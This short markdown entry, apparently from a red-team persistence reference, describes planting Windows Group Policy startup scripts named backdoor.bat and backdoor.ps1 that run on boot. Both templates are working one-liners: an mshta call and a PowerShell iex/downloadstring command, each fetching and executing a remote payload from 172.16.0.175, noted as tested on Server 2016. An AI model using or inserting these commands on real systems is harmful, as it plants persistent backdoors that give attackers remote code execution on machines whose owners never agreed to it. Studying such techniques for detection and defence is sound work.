# Startup Scripts
Create a startup script which executes on boot.

## File Path
`\Machine\Scripts\Startup\backdoor.bat`

## File Template
`mshta.exe http://172.16.0.175/a`

## File Path
`\Machine\Scripts\Startup\backdoor.ps1`

## File Template
`iex ((new-object net.webclient).downloadstring('http://172.16.0.175/a'))`

## Tested On
- Server 2016